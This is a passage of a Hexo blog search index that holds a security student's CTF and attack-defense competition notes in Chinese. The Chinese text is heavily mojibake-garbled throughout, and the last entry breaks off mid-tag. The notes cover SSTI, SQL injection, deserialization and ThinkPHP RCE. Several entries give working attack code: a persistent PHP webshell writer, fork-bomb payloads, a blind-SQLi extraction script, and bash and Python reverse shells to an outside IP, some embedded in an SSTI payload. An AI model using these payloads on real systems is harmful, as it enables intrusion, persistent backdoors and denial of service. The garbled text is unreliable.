<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>awd</title>
    <link href="/2020/11/19/awd/"/>
    <url>/2020/11/19/awd/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-refer"><a href="#0x00-refer" class="headerlink" title="0x00 refer"></a>0x00 refer</h1><p><a href="https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.jagger2zr.com/2019/08/30/AWD%E8%B5%B7%E6%89%8B%E5%BC%8F%E5%8F%8A%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p><h1 id="0x0èµ·æ‰‹"><a href="#0x0èµ·æ‰‹" class="headerlink" title="0x0èµ·æ‰‹"></a>0x0èµ·æ‰‹</h1><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p>å‹ç¼©å‘½ä»¤ï¼š<code>tar -zcvf www.tar.gz .</code></p><p>è§£å‹å‘½ä»¤ï¼štar -xvxf <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> -C .</p><p>ä¹Ÿå¯ç›´æ¥xshellè½¬ï¼Œä¸€èˆ¬å¾ˆå¿«</p><h2 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h2><p>cd /var/lib/mysql</p><p>mysqldump -u root -p Test&gt;Test0809.sql</p><p>mysql -u root -p Test&lt;Test0809.sqlï¼Œè¾“å…¥å¯†ç å³å¯ï¼ˆå°†è¦æ¢å¤çš„æ•°æ®åº“æ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨çš„æŸä¸ªç›®å½•ä¸‹ï¼Œå¹¶è¿›å…¥è¿™ä¸ªç›®å½•æ‰§è¡Œä»¥ä¸Šå‘½ä»¤|ï¼‰</p><pre><code class="hljs jboss-cli">mysqldump -uroot -p <span class="hljs-params">--single-transaction</span> <span class="hljs-params">--all-databases</span> &gt; backup.sql <span class="hljs-comment">#æ‰€æœ‰</span>mysqldump -u root -p <span class="hljs-params">--single-transaction</span> dataname &gt; dataname.sql <span class="hljs-comment">#å•ä¸ª</span><span class="hljs-comment">#é‡åˆ°åŠ é”çš„æƒ…å†µï¼š</span>mysqldump <span class="hljs-params">--skip-lock-tables</span> -uxxxx -p -h 166.111.9.173 -R urlevent20180319 &gt; <span class="hljs-string">./backup.sql</span>`mysqldump -h127.0.0.1 -uroot -ppassword database |gzip &gt; $backupDir/$database-$today.sql.gz`</code></pre><p>æˆæƒ</p><pre><code class="hljs sql"><span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> root@localhost <span class="hljs-keyword">IDENTIFIED</span> <span class="hljs-keyword">BY</span> <span class="hljs-string">"ysx123456"</span>;<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre><h3 id="æ”¹å¯†ç "><a href="#æ”¹å¯†ç " class="headerlink" title="æ”¹å¯†ç "></a>æ”¹å¯†ç </h3><pre><code class="hljs sql"><span class="hljs-keyword">update</span> mysql.user <span class="hljs-keyword">set</span> <span class="hljs-keyword">password</span>=<span class="hljs-keyword">PASSWORD</span>(<span class="hljs-string">'123456'</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">'root'</span>;<span class="hljs-keyword">flush</span> <span class="hljs-keyword">privileges</span>;</code></pre><h2 id="0x02-æƒé™æ§åˆ¶"><a href="#0x02-æƒé™æ§åˆ¶" class="headerlink" title="0x02 æƒé™æ§åˆ¶"></a>0x02 æƒé™æ§åˆ¶</h2><h4 id="å†™ä¸æ­»é©¬"><a href="#å†™ä¸æ­»é©¬" class="headerlink" title="å†™ä¸æ­»é©¬"></a>å†™ä¸æ­»é©¬</h4><ul><li><p>evalå‹</p><pre><code class="hljs perl">def write_memery_webshell(url, directory, password):     sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>    code = <span class="hljs-string">"&lt;?php $content = '&lt;?php eval(base64_decode($_REQUEST[%s]));?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0);      while(true)&#123; if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time)    filename = <span class="hljs-string">".%s.php"</span> % (password)    path = <span class="hljs-string">"%s/%s"</span> % (directory, filename)    payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>))     <span class="hljs-keyword">print</span> payload     <span class="hljs-keyword">return</span> code_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre></li><li><p>å‘½ä»¤å‹</p></li></ul><pre><code class="hljs perl">def write_memery_webshell(url, directory, password):     sleep_time = <span class="hljs-number">500</span> <span class="hljs-comment"># micro second </span>    code = <span class="hljs-string">"&lt;?php                                       ?&gt;'; $writable_path = '%s'; $filename = '.%s.php'; $path = $writable_path.'/'.$filename; ignore_user_abort(true); set_time_limit(0); while(true)&#123;      if(file_get_contents($path) != $content)&#123; file_put_contents($path, $content); &#125; usleep(%d); &#125;?&gt;"</span> % (password, directory, password, sleep_time)     filename = <span class="hljs-string">".%s.php"</span> % (password)     path = <span class="hljs-string">"%s/%s"</span> % (directory, filename)     payload = <span class="hljs-string">"file_put_contents('%s', base64_decode('%s'));"</span> % (path, code.encode(<span class="hljs-string">"base64"</span>).replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">""</span>))     <span class="hljs-keyword">return</span> shell_exec(url, payload).<span class="hljs-keyword">split</span>(<span class="hljs-string">"\n"</span>)[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>]</code></pre><ul><li>å”¤é†’å†…å­˜é©¬</li></ul><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">active_memery_webshell</span><span class="hljs-params">(url)</span>:</span>     <span class="hljs-keyword">try</span>:         requests.get(url, timeout=<span class="hljs-number">0.5</span>)     <span class="hljs-keyword">except</span>:         <span class="hljs-keyword">print</span> <span class="hljs-string">"[+] OK!"</span></code></pre><h4 id="forkç‚¸å¼¹"><a href="#forkç‚¸å¼¹" class="headerlink" title="forkç‚¸å¼¹"></a>forkç‚¸å¼¹</h4><ul><li><p>evalå‹</p><pre><code class="hljs routeros">def eval_fork(ip):     host = ip   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span>     url = <span class="hljs-string">"http://%s:%s/code.php"</span> % (host, port)     code = <span class="hljs-string">"system(\"echo '.() &#123; .|.&amp; &#125; &amp;&amp; .' &gt; /tmp/aaa\");system(\"/bin/bash /tmp/aaa\");echo \"seems good!\";"</span>     data = &#123;<span class="hljs-string">'pass'</span>:code&#125;    requests.post(url, <span class="hljs-attribute">data</span>=data)</code></pre></li><li><p>å‘½ä»¤å‹</p><pre><code class="hljs routeros">def shell_fork(ip):     host = ip   <span class="hljs-built_in"> port </span>= <span class="hljs-string">"80"</span>     url = <span class="hljs-string">"http://%s:%s/c.php"</span> % (host, port)     command = <span class="hljs-string">":()&#123; :|: &amp; &#125;;:"</span>     shell_exec(url, command)</code></pre></li></ul><h2 id="0x03-æµé‡"><a href="#0x03-æµé‡" class="headerlink" title="0x03 æµé‡"></a>0x03 æµé‡</h2><h3 id="è„æµé‡"><a href="#è„æµé‡" class="headerlink" title="è„æµé‡"></a>è„æµé‡</h3>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºæœ¬åŠŸ</title>
    <link href="/2020/11/16/%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    <url>/2020/11/16/%E5%9F%BA%E6%9C%AC%E5%8A%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><p>æ„Ÿè§‰æ–‡ä»¶ä¸Šä¼ è¿™ä¸€å—å§¿åŠ¿ç‚¹æ¯”è¾ƒå¥½ç†è§£ï¼Œåˆ·å®Œ uploads-lab çš„è¯ï¼ŒåŸºæœ¬å§¿åŠ¿å°±æŒæ¡å·®ä¸å¤šäº†ã€‚</p><ul><li><del>%00 æˆªæ–­</del></li><li><del>éå¸¸è§„åç¼€ç»•è¿‡</del></li><li>.htaccess è§£æç»•è¿‡</li><li><del>å›¾ç‰‡å¤´æ•ˆæœ</del></li><li><del>MIME ç»•è¿‡</del></li><li><del>å‰ç«¯ç»•è¿‡</del></li><li>äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</li><li><del>æ¡ä»¶ç«äº‰ç»•è¿‡</del></li><li>multipart/form-data ç»•è¿‡</li></ul><h2 id="æ–‡ä»¶åŒ…å«-ä¸‹è½½"><a href="#æ–‡ä»¶åŒ…å«-ä¸‹è½½" class="headerlink" title="æ–‡ä»¶åŒ…å«/ä¸‹è½½"></a>æ–‡ä»¶åŒ…å«/ä¸‹è½½</h2><p>æ–‡ä»¶åŒ…å«çš„è¯ï¼ŒåŸºæœ¬ä¸Šå•ç‹¬æ€»ç»“ä¸€ä¸‹ä¹Ÿæ˜¯å¯ä»¥å¿«é€Ÿå­¦ä¹ ç†è§£çš„ï¼Œæ‰€ä»¥çŸ­æ¿ä¸å¤šï¼Œä½†ä¸ä»£è¡¨æ²¡æœ‰ã€‚</p><ul><li><del>æ–‡ä»¶åŒ…å«åŸç†</del></li><li><del>æœ¬åœ°æ–‡ä»¶åŒ…å«çªç ´åç¼€</del></li><li><del>è¿œç¨‹æ–‡ä»¶åŒ…å«çªç ´åç¼€</del></li><li><del>PHP æ–‡ä»¶åŒ…å«é…åˆä¼ªåè®®</del></li><li><del>æ–‡ä»¶åŒ…å« Web æ—¥å¿—</del></li><li><del>æ–‡ä»¶åŒ…å« Sessions</del></li><li><del>æ–‡ä»¶åŒ…å« SSH æ—¥å¿—</del></li><li>æ–‡ä»¶åŒ…å«é…åˆ phpinfo()</li><li>æ–‡ä»¶åŒ…å«é…åˆç³»ç»Ÿ proc è¿›ç¨‹</li><li>æ–‡ä»¶åŒ…å« require_once ç»•è¿‡</li></ul><h2 id="åŸŸæ¸—é€"><a href="#åŸŸæ¸—é€" class="headerlink" title="åŸŸæ¸—é€"></a>åŸŸæ¸—é€</h2><p><img src="/neiwang/test.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2020/11/14/ssti/"/>
    <url>/2020/11/14/ssti/</url>
    
    <content type="html"><![CDATA[<h3 id="ç»•è¿‡ç±»å‹"><a href="#ç»•è¿‡ç±»å‹" class="headerlink" title="ç»•è¿‡ç±»å‹"></a>ç»•è¿‡ç±»å‹</h3><pre><code class="hljs markdown">&#123;&#123; eval popen &#123;% if request[<span class="hljs-string">'application'</span>][<span class="hljs-symbol">'__globals__'</span>][<span class="hljs-string">'__builtins__'</span>][<span class="hljs-symbol">'__import__'</span>]('os')[<span class="hljs-string">'popen'</span>](<span class="hljs-link">'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM</span>);s.connect((\"129.211.9.7\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">\"/bin/sh\",\"-i\"</span>]);"')[<span class="hljs-string">'read'</span>](<span class="hljs-link"></span>)%&#125; a &#123;% endif %&#125;</code></pre><p>æ³¨æ„å¼¹shellç”¨pythonå¼¹</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlæ³¨å…¥</title>
    <link href="/2020/11/14/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/11/14/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><ul><li><del>MySQL åŸºç¡€è¯­æ³•</del></li><li>MySQL ç›¸å…³å‡½æ•°</li><li><del>MySQL UNION è”åˆæŸ¥è¯¢æ³¨å…¥</del></li><li><del>MySQL æŠ¥é”™æ³¨å…¥</del></li><li><del>MySQL å¸ƒå°”ç±»å‹ç›²æ³¨</del></li><li><del>MySQL å»¶æ—¶ç±»å‹ç›²æ³¨</del></li><li>MySQL å †å æ³¨å…¥</li><li><del>MySQL äºŒæ¬¡æ³¨å…¥</del></li><li>MySQL DNSLog å¤–å¸¦æ•°æ®</li><li>MySQL å¼‚æˆ–æ³¨å…¥</li><li><del>MySQL æ³¨å…¥å¸¸è§„ Bypass æŠ€å·§</del></li><li>MySQL æ³¨å…¥è¿›é˜¶ Bypass æŠ€å·§</li><li><del>SQLMap åŸºç¡€ä½¿ç”¨</del></li><li>SQLMap è¿›é˜¶ä½¿ç”¨</li><li>SQLMap Tamper ç¼–å†™</li><li>MSSQL å­¦ä¹ </li><li>Oracle å­¦ä¹ </li><li>MSSQL æ³¨å…¥æ·±å…¥ç†è§£</li><li>Oracle æ³¨å…¥æ·±å…¥ç†è§£</li></ul><h3 id="æ ¼å¼åŒ–æ³¨å…¥"><a href="#æ ¼å¼åŒ–æ³¨å…¥" class="headerlink" title="æ ¼å¼åŒ–æ³¨å…¥"></a>æ ¼å¼åŒ–æ³¨å…¥</h3><p>sprinfå¼•èµ·</p><p>å½“%æ•°é‡å’Œå‚æ•°æ•°é‡ç›¸ç­‰æ—¶ï¼Œç”±å‰åˆ°åæ›¿æ¢ï¼Œå½“%æ•°é‡å¤šäº$æ—¶,we need special characters $</p><p>When we use %1$ means it will replace at first,and after that if we use sprint % and \ after it will be cleaned which means our â€˜ will  get out and results sql injection.</p><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> re<span class="hljs-comment"># from urllib import parse</span>url = <span class="hljs-string">'http://eci-2ze006f3h1dki6w6m8h5.cloudeci1.ichunqiu.com/index.php'</span><span class="hljs-comment"># params = 'input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:6:"127.00";&#125;s:5:"check";s:19:"key****************";&#125;'</span>flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">999</span>):    low = <span class="hljs-number">32</span>    high = <span class="hljs-number">127</span>    <span class="hljs-keyword">while</span> low &lt; high:        mid = (low + high) // <span class="hljs-number">2</span>        sql= <span class="hljs-string">'(ascii(mid((select x.1 from(select 1 union select * from fl4g)x limit 1,1),&#123;&#125;,1))&gt;&#123;&#125;)'</span>        data = &#123;<span class="hljs-string">"username"</span>: <span class="hljs-string">"admin"</span>, <span class="hljs-string">"password"</span>: <span class="hljs-string">"%1$' || "</span> + sql.format(i, mid) + <span class="hljs-string">"#"</span>&#125;        text = requests.post(url=url,data=data).text        code = re.findall(<span class="hljs-string">r' &lt;strong&gt;(.*)&lt;/strong&gt;'</span>,text,re.S)        code = code[<span class="hljs-number">0</span>]        <span class="hljs-comment">#print(code)</span>        <span class="hljs-comment">#print(code) &lt;strong&gt;&lt;/strong&gt;</span>        <span class="hljs-keyword">if</span>(<span class="hljs-string">"Success!"</span> <span class="hljs-keyword">in</span> code):            low = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            high = mid    flag += chr(low)    print(flag)<span class="hljs-comment">#if((ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=databse()),0,1))&gt;1),"n1ctf",1) #--å¤§æ¦‚ä¼šç”¨2Sæ—¶é—´</span></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¼¹shellçš„æ–¹å¼</title>
    <link href="/2020/11/14/%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
    <url>/2020/11/14/%E5%BC%B9shell%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><p>bash -i &gt;&amp; /dev/tcp/129.211.9.7/8888 0&gt;&amp;1</p><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><p>python3 -c \â€˜import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((â€œ129.211.9.7â€,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([â€œ/bin/shâ€,â€-iâ€]);\â€˜</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ai_learn</title>
    <link href="/2020/11/02/ai-learn/"/>
    <url>/2020/11/02/ai-learn/</url>
    
    <content type="html"><![CDATA[<h1 id="æœºå™¨å­¦ä¹ "><a href="#æœºå™¨å­¦ä¹ " class="headerlink" title="æœºå™¨å­¦ä¹ "></a>æœºå™¨å­¦ä¹ </h1>]]></content>
    
    
    
    <tags>
      
      <tag>æœºå™¨å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>larvel</title>
    <link href="/2020/09/01/larvel/"/>
    <url>/2020/09/01/larvel/</url>
    
    <content type="html"><![CDATA[<h2 id="laravel5-8-RCEåˆ†æ"><a href="#laravel5-8-RCEåˆ†æ" class="headerlink" title="laravel5.8 RCEåˆ†æ"></a>laravel5.8 RCEåˆ†æ</h2><p>èµ·ç¯å¢ƒ</p><pre><code class="hljs dsconfig"><span class="hljs-string">composer </span><span class="hljs-built_in">create-project</span> <span class="hljs-built_in">--prefer-dist</span> <span class="hljs-string">laravel/</span><span class="hljs-string">laravel </span><span class="hljs-string">blog </span><span class="hljs-string">"5.8.0"</span></code></pre><p>èµ·æœåŠ¡</p><pre><code class="hljs ebnf"><span class="hljs-attribute">php artisan serve</span></code></pre><p>ä¸ºå•¥å­è¦è¿™æ ·èµ·ï¼Ÿï¼Ÿï¼Ÿ</p><p><img src="/img/vul/4.png" srcset="/img/loading.gif" alt=""></p><p>åœ¨ <code>laravel58/routes/web.php</code> æ–‡ä»¶æ·»åŠ è·¯ç”±</p><pre><code class="hljs arduino">Route::<span class="hljs-built_in">get</span>(<span class="hljs-string">"/"</span>,<span class="hljs-string">"\App\Http\Controllers\DemoController@demo"</span>);</code></pre><p>ç„¶åå°±å˜æˆè¿™æ ·</p><p><img src="/img/vul/5.png" srcset="/img/loading.gif" alt=""></p><p>æ˜¯ä¸æ˜¯å¾ˆåƒctfèµ›é¢˜äº†ï¼Ÿ</p><p><a href="https://xz.aliyun.com/t/6059" target="_blank" rel="noopener">https://xz.aliyun.com/t/6059</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—</title>
    <link href="/2020/08/28/%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
    <url>/2020/08/28/%E5%8F%8D%E5%BA%8F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä¸€ç›´æƒ³æ‰¾ä¸ªæ—¶é—´å¼ºåŒ–ä¸‹ä¸“é¢˜è®­ç»ƒï¼Œååºåˆ—åœ¨å®æˆ˜ä»£ç å®¡è®¡ä¸­ç”¨çš„æŒºå¤šçš„ï¼Œä½†æˆ‘ä¸€ç›´éƒ½æ²¡æœ‰å¥½å¥½å¼ºåŒ–è¿‡ï¼Œè¿ä¸€æ¡å¾ˆçŸ­çš„popé“¾éƒ½æ„é€ ä¸å‡ºæ¥ï¼Œè¿™ä¸¤å¤©å¥½å¥½å¼ºåŒ–ä¸‹ã€‚</p><h2 id="0x01-ä»åŸºç¡€å¼€å§‹"><a href="#0x01-ä»åŸºç¡€å¼€å§‹" class="headerlink" title="0x01 ä»åŸºç¡€å¼€å§‹"></a>0x01 ä»åŸºç¡€å¼€å§‹</h2><p>åˆ©ç”¨serializeå°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–ä¸ºå­—ç¬¦ä¸²å½¢å¼ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<span class="hljs-keyword">public</span> $name = <span class="hljs-string">'d3vil'</span>;<span class="hljs-keyword">protected</span> $age = <span class="hljs-number">18</span>;<span class="hljs-keyword">private</span> $sex = <span class="hljs-string">'boy'</span>;&#125;$a = <span class="hljs-keyword">new</span> A();print_r($a);<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;$ser_a = serialize($a);print_r($ser_a);</code></pre><p>å¾—åˆ°çš„ç»“æœæ˜¯</p><p>A Object (    [name] =&gt; d3vil    [age:protected] =&gt; 18    [sex:A:private] =&gt; boy )<br>O:1:â€Aâ€:3:{s:4:â€nameâ€;s:5:â€d3vilâ€;s:6:â€*ageâ€;i:18;s:6:â€Asexâ€;s:3:â€boyâ€;}</p><p>Oä»£è¡¨æ˜¯ä¸€ä¸ªç±»å®ä¾‹åŒ–å¯¹è±¡</p><p>1æ˜¯ç±»åç§°é•¿åº¦</p><p>Aæ˜¯ç±»åç§°</p><p>æœ‰3ä¸ªæˆå‘˜å±æ€§</p><p>sä»£è¡¨å­—ç¬¦ä¸²</p><p>é•¿åº¦ä¸º4çš„name</p><p>å€¼æ˜¯é•¿åº¦ä¸º5çš„d3vil</p><p>æ³¨æ„åé¢ä¸¤ä¸ªå±æ€§ï¼Œä¸€ä¸ªæ˜¯protected,ä¸€ä¸ªæ˜¯private</p><p>æˆ‘ä»¬ç”¨urlencodeä¹‹åçœ‹çœ‹</p><p>O%3A1%3A%22A%22%3A3%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22d3vil%22%3Bs%3A6%3A%22%00%2A%00age%22%3Bi%3A18%3Bs%3A6%3A%22%00A%00sex%22%3Bs%3A3%3A%22boy%22%3B%7D</p><p>åœ¨protectedå±æ€§ä¸­ï¼Œé”®åå‰è¦åŠ %00%2A%00ageï¼Œä¹Ÿå°±æ˜¯\x00*\x00ï¼Œè¿™ä¹Ÿæ˜¯é”®åé•¿åº¦ä¸º6çš„åŸå› ï¼Œåœ¨privateé”®åå‰è¦åŠ \x00ç±»å\x00ã€‚</p><pre><code class="hljs lasso">ä¸‰è€…åŒºåˆ«<span class="hljs-keyword">public</span>(å…¬å…±çš„):åœ¨æœ¬ç±»å†…éƒ¨ã€å¤–éƒ¨ç±»ã€å­ç±»éƒ½å¯ä»¥è®¿é—®<span class="hljs-keyword">protect</span>(å—ä¿æŠ¤çš„):åªæœ‰æœ¬ç±»æˆ–å­ç±»æˆ–çˆ¶ç±»ä¸­å¯ä»¥è®¿é—®<span class="hljs-keyword">private</span>(ç§äººçš„):åªæœ‰æœ¬ç±»å†…éƒ¨å¯ä»¥ä½¿ç”¨å¯ä»¥çœ‹å‡ºï¼Œ<span class="hljs-keyword">protect</span>æ˜¯åªæ˜¯ä¸è®©å¤–éƒ¨è®¿é—®ï¼Œ<span class="hljs-keyword">private</span>æ˜¯åªèƒ½æœ¬ç±»è®¿é—®ã€‚æ‰€ä»¥$a -&gt; sex = <span class="hljs-string">'123'</span>;è¿™ç§æ–¹å¼åªæœ‰<span class="hljs-keyword">public</span>æ‰è¡Œï¼Œåœ¨æ„é€ é“¾å­çš„æ—¶å€™ï¼Œå¦‚æœè¦æ”¹å…¶ä»–ä¸¤ä¸ªç›´æ¥åœ¨ç±»å‡½æ•°é‡ŒåŠ </code></pre><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p>å®šä¹‰ï¼šååºåˆ—åŒ–å°±æ˜¯åˆ©ç”¨<code>unserailize()</code>å‡½æ•°å°†ä¸€ä¸ªç»è¿‡åºåˆ—åŒ–çš„å­—ç¬¦ä¸²è¿˜åŸæˆphpä»£ç å½¢å¼</p><h4 id="ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´åŸç†"></a>ååºåˆ—åŒ–æ¼æ´åŸç†</h4><p>åœ¨ååºåˆ—çš„æ—¶å€™ä¼šè°ƒç”¨é­”æœ¯æ–¹æ³•</p><pre><code class="hljs less"><span class="hljs-selector-tag">__construct</span>()å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨<span class="hljs-selector-tag">__destruct</span>()å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨<span class="hljs-selector-tag">__toString</span>()å½“ååºåˆ—åŒ–åçš„å¯¹è±¡è¢«è¾“å‡ºçš„æ—¶å€™(è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„æ—¶å€™)è¢«è°ƒç”¨<span class="hljs-selector-tag">__sleep</span>() åœ¨å¯¹è±¡åœ¨è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ<span class="hljs-selector-tag">__wakeup</span>å°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>ctf ä»£ç å®¡è®¡</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub</title>
    <link href="/2020/07/16/vulhub/"/>
    <url>/2020/07/16/vulhub/</url>
    
    <content type="html"><![CDATA[<h1 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h1><h3 id="vulhubæ˜¯ä¸€ä¸ªé›†æˆå¥½æ¼æ´ç¯å¢ƒçš„å¼€æºé¡¹ç›®"><a href="#vulhubæ˜¯ä¸€ä¸ªé›†æˆå¥½æ¼æ´ç¯å¢ƒçš„å¼€æºé¡¹ç›®" class="headerlink" title="vulhubæ˜¯ä¸€ä¸ªé›†æˆå¥½æ¼æ´ç¯å¢ƒçš„å¼€æºé¡¹ç›®"></a>vulhubæ˜¯ä¸€ä¸ªé›†æˆå¥½æ¼æ´ç¯å¢ƒçš„å¼€æºé¡¹ç›®</h3><p>æ¥ä¸‹æ¥ï¼Œå°†è·Ÿç€ç¯å¢ƒè¿›è¡Œå¤ç°è°ƒè¯•ã€‚</p><h1 id="0x01-thinkphp-2-rce"><a href="#0x01-thinkphp-2-rce" class="headerlink" title="0x01 thinkphp/2-rce/"></a>0x01 <a href="https://github.com/vulhub/vulhub/tree/master/thinkphp" target="_blank" rel="noopener">thinkphp</a>/<strong>2-rce</strong>/</h1><p>index.php?s=/index/index/name/${@phpinfo()}</p><p><img src="/vul/1.png" srcset="/img/loading.gif" alt=""></p><p>é¡ºä¾¿ç ”ç©¶ä¸‹æ¡†æ¶</p><ol><li><p>å…ˆæ˜¯å»åŠ è½½thinkphpï¼Œthinkphpä¼šè®°å½•ä¸€äº›åŠ è½½æ—¶é—´å’Œå˜é‡ç¯å¢ƒå®šä¹‰ï¼Œå¦‚tp2è¦æ±‚phpå¤§äº5ï¼Œç„¶åå»åŠ è½½runtime</p></li><li><p>PHPSTORMæ ¼å¼åŒ–ä»£ç å¿«æ·é”®ï¼š</p><p>windowså¹³å°ï¼šCtrl+Alt+L</p></li><li><p>runtimeï¼Œç„¶åå®šä¹‰ä¸€äº›å˜é‡ï¼ŒåŠ è½½ä¸€äº›æ–¹æ³•ã€‚</p></li><li><p>ThinkPHPçš„utilé‡Œæ”¾äº†ä¸€äº›ç±»æ–¹æ³•ï¼Œé‡Œé¢æœ‰ä¸€äº›å¤„ç†sessionç­‰çš„ç±»</p><p><img src="/vul/2.png" srcset="/img/loading.gif" alt=""></p></li><li><p>å¯ä»¥çœ‹åˆ°ç»è¿‡ä¸€æ³¢çjbè°ƒè¯•åæˆ‘æ¥åˆ°äº†æ¼æ´ç‚¹ï¼Œä»–æ˜¯åœ¨å¤„ç†è·¯ç”±çš„æ—¶å€™å‘ç”Ÿçš„ï¼Œç»è¿‡Cæ–¹æ³•ä¸€å¤§å †é…ç½®åï¼Œè°ƒç”¨dispatchæ–¹æ³•ï¼Œ</p></li></ol><p>åˆæ£€æŸ¥äº†ä¸€å¤§å †è·¯ç”±çš„é…ç½®ï¼Œç„¶åé»˜è®¤è§„åˆ™è°ƒåº¦URLï¼Œåœ¨</p><pre><code class="hljs autoit">$res = preg_replace(<span class="hljs-string">'@(\w+)'</span>.$depr.<span class="hljs-string">'([^'</span>.$depr.<span class="hljs-string">'\/]+)@e'</span>, <span class="hljs-string">'$var[\'</span>\\<span class="hljs-number">1</span>\<span class="hljs-string">']="\\2";'</span>, implode($depr,$paths))<span class="hljs-comment">;</span>æ­£åˆ™æ˜¯@(\w+)/([^/\/]+)<span 